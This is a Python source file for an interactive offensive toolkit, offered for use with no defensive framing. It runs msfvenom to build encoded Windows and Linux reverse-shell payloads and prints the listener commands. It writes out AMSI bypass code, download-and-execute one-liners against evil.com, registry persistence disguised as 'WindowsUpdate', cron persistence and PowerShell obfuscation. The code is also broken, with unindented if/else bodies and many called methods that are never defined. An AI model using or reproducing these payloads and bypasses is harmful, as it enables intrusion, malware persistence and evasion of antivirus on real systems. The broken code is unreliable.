#!/usr/bin/env python3

import subprocess
import sys
import os
import base64
from core.utils import *
from core.config import *

class AdvancedOffensiveToolkit:
    def __init__(self):
        self.tools = {
            "payload_generation": "Advanced payload creation and encoding",
            "c2_frameworks": "Command & Control framework setup",
            "persistence": "Covert persistence mechanisms",
            "evasion": "Defense evasion techniques",
            "lateral_movement": "Network propagation tools",
            "privilege_escalation": "Advanced privesc techniques"
        }
    
    def payload_generation_menu(self):
        """Advanced payload generation tools"""
        banner("Advanced Payload Generation")
        
        console.print("[bold cyan]Payload Generation Tools:[/bold cyan]")
        console.print("▸ msfvenom - Metasploit payload generator")
        console.print("▸ Donut - In-memory .NET assembly execution")
        console.print("▸ ScareCrow - Payload creation framework")
        console.print("▸ Veil - Payload generation framework")
        console.print("▸ Custom shellcode encoder")
        
        console.print("\n[bold yellow]Select payload type:[/bold yellow]")
        console.print("  1. Windows reverse shell (msfvenom)")
        console.print("  2. Linux reverse shell (msfvenom)")
        console.print("  3. PowerShell payload")
        console.print("  4. .NET assembly loader (Donut)")
        console.print("  5. Custom encoded shellcode")
        console.print("  6. Back to main menu")
        
        choice = get_user_input("Select option (1-6)", choices=["1", "2", "3", "4", "5", "6"])
        
        if choice == "1":
            self.generate_windows_payload()
        elif choice == "2":
            self.generate_linux_payload()
        elif choice == "3":
            self.generate_powershell_payload()
        elif choice == "4":
            self.generate_donut_payload()
        elif choice == "5":
            self.generate_encoded_shellcode()
        elif choice == "6":
            return
    
    def generate_windows_payload(self):
        """Generate Windows reverse shell payload"""
        banner("Windows Payload Generation")
        
        lhost = get_user_input("Enter LHOST (your IP address)")
        lport = get_user_input("Enter LPORT (listening port)", default="4444")
        
        console.print("\n[bold cyan]Payload types:[/bold cyan]")
        payload_types = {
            "1": "windows/x64/meterpreter/reverse_tcp",
            "2": "windows/x64/shell/reverse_tcp", 
            "3": "windows/x64/meterpreter/reverse_https",
            "4": "windows/meterpreter/reverse_tcp"
        }
        
        for key, payload in payload_types.items():
            console.print(f"  {key}. {payload}")
        
        payload_choice = get_user_input("Choose payload (1-4)", choices=["1", "2", "3", "4"])
        selected_payload = payload_types[payload_choice]
        
        console.print("\n[bold cyan]Output formats:[/bold cyan]")
        formats = {
            "1": ("exe", "Executable file"),
            "2": ("raw", "Raw shellcode"),
            "3": ("ps1", "PowerShell script"),
            "4": ("dll", "Dynamic Link Library")
        }
        
        for key, (fmt, desc) in formats.items():
            console.print(f"  {key}. {fmt} - {desc}")
        
        format_choice = get_user_input("Choose format (1-4)", choices=["1", "2", "3", "4"])
        selected_format = formats[format_choice][0]
        
        output_file = get_user_input(f"Output filename [default: payload.{selected_format}]") or f"payload.{selected_format}"
        
        # Advanced evasion options
        console.print("\n[bold cyan]Evasion options:[/bold cyan]")
        console.print("  1. No encoding")
        console.print("  2. x86/shikata_ga_nai")
        console.print("  3. x64/xor_dynamic") 
        console.print("  4. Multiple iterations")
        
        encoder_choice = get_user_input("Choose encoding (1-4)", choices=["1", "2", "3", "4"])
        
        if encoder_choice == "1":
            encoder_param = ""
        elif encoder_choice == "2":
            encoder_param = "-e x86/shikata_ga_nai"
        elif encoder_choice == "3":
            encoder_param = "-e x64/xor_dynamic"
        else:
            iterations = get_user_input("Number of encoding iterations [default: 3]") or "3"
            encoder_param = f"-e x86/shikata_ga_nai -i {iterations}"
        
        command = f"msfvenom -p {selected_payload} LHOST={lhost} LPORT={lport} -f {selected_format} {encoder_param} -o {output_file}"
        
        console.print(f"\n[bold yellow]Generated command:[/bold yellow]")
        console.print(command)
        
        console.print(f"\n[bold green]Executing: {command}[/bold green]")
        try:
            result = subprocess.run(command.split(), capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                Success(f"Payload generated successfully: {output_file}")
                console.print(f"\n[bold cyan]Payload info:[/bold cyan]")
                console.print(f"• Type: {selected_payload}")
                console.print(f"• Format: {selected_format}")
                console.print(f"• Target: {lhost}:{lport}")
                
                # Show listener setup
                console.print(f"\n[bold yellow]Listener setup:[/bold yellow]")
                if "meterpreter" in selected_payload:
                console.print("msfconsole -q -x \"use exploit/multi/handler; set payload " + selected_payload + f"; set LHOST {lhost}; set LPORT {lport}; exploit\"")
                else:
                console.print(f"nc -nvlp {lport}")
            else:
            Warning(f"Payload generation failed: {result.stderr}")
        except Exception as e:
            Warning(f"Error: {e}")
    
    def generate_linux_payload(self):
        """Generate Linux reverse shell payload"""
        banner("Linux Payload Generation")
        
        lhost = get_user_input("Enter LHOST (your IP address)")
        lport = get_user_input("Enter LPORT (listening port)", default="4444")
        
        payload_types = {
            "1": "linux/x64/meterpreter/reverse_tcp",
            "2": "linux/x64/shell/reverse_tcp",
            "3": "linux/x86/meterpreter/reverse_tcp"
        }
        
        console.print("\n[bold cyan]Payload types:[/bold cyan]")
        for key, payload in payload_types.items():
            console.print(f"  {key}. {payload}")
        
        payload_choice = get_user_input("Choose payload (1-3)", choices=["1", "2", "3"])
        selected_payload = payload_types[payload_choice]
        
        formats = {
            "1": "elf",
            "2": "raw", 
            "3": "python",
            "4": "bash"
        }
        
        console.print("\n[bold cyan]Output formats:[/bold cyan]")
        for key, fmt in formats.items():
            console.print(f"  {key}. {fmt}")
        
        format_choice = get_user_input("Choose format (1-4)", choices=["1", "2", "3", "4"])
        selected_format = formats[format_choice]
        
        output_file = get_user_input(f"Output filename [default: payload.{selected_format}]") or f"payload.{selected_format}"
        
        command = f"msfvenom -p {selected_payload} LHOST={lhost} LPORT={lport} -f {selected_format} -o {output_file}"
        
        console.print(f"\n[bold green]Executing: {command}[/bold green]")
        try:
            result = subprocess.run(command.split(), capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                Success(f"Linux payload generated: {output_file}")
                console.print(f"\n[bold yellow]Make executable with:[/bold yellow] chmod +x {output_file}")
            else:
            Warning(f"Generation failed: {result.stderr}")
        except Exception as e:
            Warning(f"Error: {e}")
    
    def c2_framework_menu(self):
        """Command & Control framework setup"""
        banner("Advanced C2 Frameworks")
        
        console.print("[bold cyan]Available C2 Frameworks:[/bold cyan]")
        console.print("▸ Sliver - Modern cross-platform C2 framework")
        console.print("▸ Empire - PowerShell & Python post-exploitation framework") 
        console.print("▸ Mythic - Cross-platform C2 framework")
        console.print("▸ Cobalt Strike (commercial)")
        console.print("▸ Metasploit Framework")
        
        console.print("\n[bold yellow]Framework Options:[/bold yellow]")
        console.print("  1. Setup Sliver C2 server")
        console.print("  2. Generate Sliver implant")
        console.print("  3. Setup Empire framework")
        console.print("  4. Metasploit multi/handler")
        console.print("  5. Custom HTTP/HTTPS C2")
        console.print("  6. Back to main menu")
        
        choice = get_user_input("Select option (1-6)", choices=["1", "2", "3", "4", "5", "6"])
        
        if choice == "1":
            self.setup_sliver_server()
        elif choice == "2":
            self.generate_sliver_implant()
        elif choice == "3":
            self.setup_empire()
        elif choice == "4":
            self.setup_metasploit_handler()
        elif choice == "5":
            self.setup_custom_c2()
        elif choice == "6":
            return
    
    def setup_sliver_server(self):
        """Setup Sliver C2 server"""
        banner("Sliver C2 Server Setup")
        
        console.print("[bold cyan]Sliver C2 Framework Setup[/bold cyan]")
        console.print("Modern, cross-platform adversary simulation framework")
        
        # Check if Sliver is installed
        try:
            result = subprocess.run(["sliver", "version"], capture_output=True, text=True)
            if result.returncode == 0:
                Success("Sliver is installed and ready")
                console.print(result.stdout)
            else:
            Warning("Sliver not found. Install with: curl https://sliver.sh/install|sudo bash")
                return
        except FileNotFoundError:
            Warning("Sliver not installed. Install from: https://github.com/BishopFox/sliver")
            return
        
        console.print("\n[bold yellow]Server Configuration:[/bold yellow]")
        
        # Listener configuration
        listener_name = get_user_input("Listener name [default: default]") or "default"
        lhost = get_user_input("Listen address [default: 0.0.0.0]") or "0.0.0.0"
        lport = get_user_input("Listen port [default: 8443]") or "8443"
        
        console.print("\n[bold cyan]Protocol options:[/bold cyan]")
        protocols = {
            "1": "https",
            "2": "http", 
            "3": "dns",
            "4": "mtls"
        }
        
        for key, proto in protocols.items():
            console.print(f"  {key}. {proto}")
        
        proto_choice = get_user_input("Choose protocol (1-4)", choices=["1", "2", "3", "4"])
        selected_protocol = protocols[proto_choice]
        
        # Generate Sliver commands
        console.print(f"\n[bold green]Starting Sliver server...[/bold green]")
        console.print("\n[bold yellow]Sliver commands to run:[/bold yellow]")
        console.print(f"sliver > {selected_protocol} --lhost {lhost} --lport {lport}")
        console.print("sliver > generate --http --os windows --arch amd64")
        
        info("Start Sliver with: sliver-server")
        info("Then run the commands above to create listeners and generate implants")
    
    def persistence_menu(self):
        """Advanced persistence techniques"""
        banner("Advanced Persistence Mechanisms")
        
        console.print("[bold cyan]Persistence Techniques:[/bold cyan]")
        console.print("▸ Registry manipulation (Windows)")
        console.print("▸ Scheduled tasks & cron jobs")
        console.print("▸ Service installation")
        console.print("▸ DLL hijacking")
        console.print("▸ Startup folder placement")  
        console.print("▸ LD_PRELOAD manipulation (Linux)")
        
        console.print("\n[bold yellow]Persistence Options:[/bold yellow]")
        console.print("  1. Windows Registry persistence")
        console.print("  2. Scheduled task persistence")
        console.print("  3. Linux crontab persistence")
        console.print("  4. Service persistence")
        console.print("  5. LD_PRELOAD persistence (Linux)")
        console.print("  6. Startup folder persistence")
        console.print("  7. Back to main menu")
        
        choice = get_user_input("Select technique (1-7)", choices=["1", "2", "3", "4", "5", "6", "7"])
        
        if choice == "1":
            self.windows_registry_persistence()
        elif choice == "2":
            self.scheduled_task_persistence()
        elif choice == "3":
            self.crontab_persistence()
        elif choice == "4":
            self.service_persistence()
        elif choice == "5":
            self.ldpreload_persistence()
        elif choice == "6":
            self.startup_persistence()
        elif choice == "7":
            return
    
    def windows_registry_persistence(self):
        """Windows Registry persistence techniques"""
        banner("Windows Registry Persistence")
        
        payload_path = get_user_input("Enter payload path (e.g., C:\\Windows\\Temp\\payload.exe)")
        
        console.print("\n[bold cyan]Registry persistence locations:[/bold cyan]")
        
        reg_keys = {
            "1": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
            "2": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", 
            "3": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "4": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        }
        
        for key, location in reg_keys.items():
            console.print(f"  {key}. {location}")
        
        reg_choice = get_user_input("Choose registry key (1-4)", choices=["1", "2", "3", "4"])
        selected_key = reg_keys[reg_choice]
        
        entry_name = get_user_input("Registry entry name [default: WindowsUpdate]") or "WindowsUpdate"
        
        command = f'reg add "{selected_key}" /v "{entry_name}" /t REG_SZ /d "{payload_path}" /f'
        
        console.print(f"\n[bold yellow]Registry command:[/bold yellow]")
        console.print(command)
        
        console.print(f"\n[bold cyan]Verification command:[/bold cyan]")
        console.print(f'reg query "{selected_key}" /v "{entry_name}"')
        
        console.print(f"\n[bold red]Cleanup command:[/bold red]")
        console.print(f'reg delete "{selected_key}" /v "{entry_name}" /f')
    
    def crontab_persistence(self):
        """Linux crontab persistence"""
        banner("Linux Crontab Persistence")
        
        payload_path = get_user_input("Enter payload path (e.g., /tmp/payload)")
        
        console.print("\n[bold cyan]Crontab schedules:[/bold cyan]")
        schedules = {
            "1": ("@reboot", "Run at system startup"),
            "2": ("*/5 * * * *", "Every 5 minutes"),
            "3": ("0 * * * *", "Every hour"),
            "4": ("0 0 * * *", "Daily at midnight"),
            "5": ("custom", "Custom schedule")
        }
        
        for key, (schedule, desc) in schedules.items():
            console.print(f"  {key}. {schedule} - {desc}")
        
        schedule_choice = get_user_input("Choose schedule (1-5)", choices=["1", "2", "3", "4", "5"])
        
        if schedule_choice == "5":
            selected_schedule = get_user_input("Enter custom cron schedule (e.g., */10 * * * *)")
        else:
            selected_schedule = schedules[schedule_choice][0]
        
        cron_entry = f"{selected_schedule} {payload_path}"
        
        console.print(f"\n[bold yellow]Crontab entry:[/bold yellow]")
        console.print(cron_entry)
        
        console.print(f"\n[bold green]Installation commands:[/bold green]")
        console.print("crontab -l > /tmp/current_cron")
        console.print(f'echo "{cron_entry}" >> /tmp/current_cron')
        console.print("crontab /tmp/current_cron")
        console.print("rm /tmp/current_cron")
        
        console.print(f"\n[bold cyan]Verification:[/bold cyan]")
        console.print("crontab -l")
    
    def evasion_menu(self):
        """Defense evasion techniques"""
        banner("Defense Evasion Techniques")
        
        console.print("[bold cyan]Evasion Techniques:[/bold cyan]")
        console.print("▸ AMSI bypass techniques")
        console.print("▸ PowerShell obfuscation")
        console.print("▸ Binary packing/encoding")
        console.print("▸ Process injection")
        console.print("▸ Living off the land binaries")
        
        console.print("\n[bold yellow]Evasion Options:[/bold yellow]")
        console.print("  1. AMSI bypass methods")
        console.print("  2. PowerShell obfuscation")
        console.print("  3. Binary encoding/packing")
        console.print("  4. LOLBAS techniques")
        console.print("  5. Process hollowing")
        console.print("  6. Back to main menu")
        
        choice = get_user_input("Select technique (1-6)", choices=["1", "2", "3", "4", "5", "6"])
        
        if choice == "1":
            self.amsi_bypass()
        elif choice == "2":
            self.powershell_obfuscation()
        elif choice == "3":
            self.binary_encoding()
        elif choice == "4":
            self.lolbas_techniques()
        elif choice == "5":
            self.process_hollowing()
        elif choice == "6":
            return
    
    def amsi_bypass(self):
        """AMSI bypass techniques"""
        banner("AMSI Bypass Techniques")
        
        console.print("[bold cyan]AMSI (Antimalware Scan Interface) Bypass Methods:[/bold cyan]")
        
        bypasses = {
            "1": ('S`eT-It`em ( \'V\'+\'aR\' +  \'IA\' + \'blE:1q2\'  + \'uAZ\'  ) ( [TYpE](  "{1}{0}"-F\'F\',\'rE\'  ) )  ; (    Get-varI`A`BLE  ( "1Q2U"  +"aZ"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f\'Util\',\'A\',\'Amsi\',\'.\',\'msi\',\'s\',\'System\'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f\'amsi\',\'d\',\'InitFaile\'  ),(  "{2}{4}{0}{1}{3}" -f \'Stat\',\'i\',\'Non\',\'c\',\'Publ\'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )', "PowerShell memory patching"),
            "2": ('[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)', "Direct .NET reflection"),
            "3": ('$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields(\'NonPublic,Static\');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$True)', "Obfuscated reflection")
        }
        
        console.print("\n[bold cyan]Available AMSI bypasses:[/bold cyan]")
        for key, (code, desc) in bypasses.items():
            console.print(f"  {key}. {desc}")
        
        bypass_choice = get_user_input("Choose bypass method (1-3)", choices=["1", "2", "3"])
        selected_bypass, description = bypasses[bypass_choice]
        
        console.print(f"\n[bold yellow]{description}:[/bold yellow]")
        console.print(f"[dim]{selected_bypass}[/dim]")
        
        console.print(f"\n[bold cyan]Usage:[/bold cyan]")
        console.print("1. Run the bypass in PowerShell")
        console.print("2. Execute your malicious PowerShell commands")
        console.print("3. AMSI will not scan the subsequent commands")
        
    
    def powershell_obfuscation(self):
        """PowerShell obfuscation techniques"""
        banner("PowerShell Obfuscation")
        
        command = get_user_input("Enter PowerShell command to obfuscate")
        
        console.print("\n[bold cyan]Obfuscation techniques:[/bold cyan]")
        
        # Simple character replacement
        obfuscated1 = command.replace('o', '0').replace('i', '1').replace('e', '3')
        console.print(f"1. Character replacement: {obfuscated1}")
        
        # Base64 encoding
        import base64
        encoded = base64.b64encode(command.encode()).decode()
        obfuscated2 = f"powershell -EncodedCommand {encoded}"
        console.print(f"2. Base64 encoding: {obfuscated2}")
        
        # String concatenation
        chars = [f"'{c}'" for c in command]
        obfuscated3 = f"powershell -Command ({'+'.join(chars)})"
        console.print(f"3. String concatenation: {obfuscated3}")
        
        console.print(f"\n[bold cyan]Advanced obfuscation tools:[/bold cyan]")
        console.print("• Invoke-Obfuscation framework")
        console.print("• ISE-Steroids obfuscation")
        console.print("• PowerShell Empire obfuscation")
    
    def binary_encoding(self):
        """Binary encoding and packing techniques"""
        banner("Binary Encoding & Packing")
        
        console.print("[bold cyan]Binary evasion techniques:[/bold cyan]")
        console.print("▸ UPX packing")
        console.print("▸ Custom packers")
        console.print("▸ Crypters")
        console.print("▸ Polymorphic engines")
        
        console.print("\n[bold yellow]Common tools:[/bold yellow]")
        console.print("1. UPX - Ultimate Packer for eXecutables")
        console.print("2. Custom XOR encoding")
        console.print("3. Base64 encoding")
        console.print("4. Veil-Evasion framework")
        
        info("Use these techniques to evade static analysis detection")
    
    def lolbas_techniques(self):
        """Living Off the Land Binaries and Scripts"""
        banner("LOLBAS Techniques")
        
        console.print("[bold cyan]Living Off the Land Binaries and Scripts (LOLBAS):[/bold cyan]")
        console.print("Using legitimate system binaries for malicious purposes")
        
        console.print("\n[bold yellow]Common LOLBAS techniques:[/bold yellow]")
        
        techniques = {
            "1": ("PowerShell", "powershell -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://evil.com/script.ps1')\""),
            "2": ("Certutil", "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe"),
            "3": ("BITSAdmin", "bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/payload.exe c:\\temp\\payload.exe"),
            "4": ("Regsvr32", "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"),
            "5": ("Rundll32", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/payload.sct\")"),
            "6": ("Mshta", "mshta http://evil.com/payload.hta")
        }
        
        for key, (tool, command) in techniques.items():
            console.print(f"\n{key}. [bold cyan]{tool}[/bold cyan]")
            console.print(f"   [dim]{command}[/dim]")
        
        console.print(f"\n[bold yellow]Resources:[/bold yellow]")
        console.print("• LOLBAS Project: https://lolbas-project.github.io/")
        console.print("• GTFOBins (Linux): https://gtfobins.github.io/")
        
    
    def process_hollowing(self):
        """Process hollowing technique"""
        banner("Process Hollowing")
        
        console.print("[bold cyan]Process Hollowing Technique:[/bold cyan]")
        console.print("Advanced code injection technique that replaces the memory of a legitimate process")
        
        console.print("\n[bold yellow]Steps:[/bold yellow]")
        console.print("1. Create a legitimate process in suspended state")
        console.print("2. Unmap the original image from memory")
        console.print("3. Allocate new memory and write malicious code")
        console.print("4. Update process context and resume execution")
        
        console.print("\n[bold cyan]Tools for process hollowing:[/bold cyan]")
        console.print("• Process Hacker")
        console.print("• Custom C/C++ implementations")
        console.print("• PowerShell Empire modules")
        console.print("• Metasploit migrate module")
        
    
    def display_menu(self):
        """Display advanced offensive toolkit menu"""
        clear()
        Title("Advanced Offensive Security Toolkit")
        
        
        console.print("[bold cyan]▸[/bold cyan] Advanced Payload Generation")
        console.print("  [dim cyan]msfvenom, Donut, ScareCrow, custom encoders[/dim cyan]")
        console.print("  [bold white]Select: 1[/bold white]\n")
        
        console.print("[bold cyan]▸[/bold cyan] Command & Control Frameworks") 
        console.print("  [dim cyan]Sliver, Empire, Mythic, custom C2 channels[/dim cyan]")
        console.print("  [bold white]Select: 2[/bold white]\n")
        
        console.print("[bold cyan]▸[/bold cyan] Advanced Persistence Mechanisms")
        console.print("  [dim cyan]Registry, crontab, services, LD_PRELOAD[/dim cyan]")
        console.print("  [bold white]Select: 3[/bold white]\n")
        
        console.print("[bold cyan]▸[/bold cyan] Defense Evasion Techniques")
        console.print("  [dim cyan]AMSI bypass, obfuscation, encoding[/dim cyan]")
        console.print("  [bold white]Select: 4[/bold white]\n")
        
        console.print("[bold cyan]▸[/bold cyan] Back to Main Menu")
        console.print("  [bold white]Select: 0[/bold white]\n")
        
        choice = get_user_input("Select option", choices=["1", "2", "3", "4", "0"])
        
        if choice == "1":
            self.payload_generation_menu()
        elif choice == "2":
            self.c2_framework_menu()
        elif choice == "3":
            self.persistence_menu()
        elif choice == "4":
            self.evasion_menu() 
        elif choice == "0":
            return
        
        Continue()

def run():
    """Entry point for advanced offensive toolkit"""
    toolkit = AdvancedOffensiveToolkit()
    toolkit.display_menu()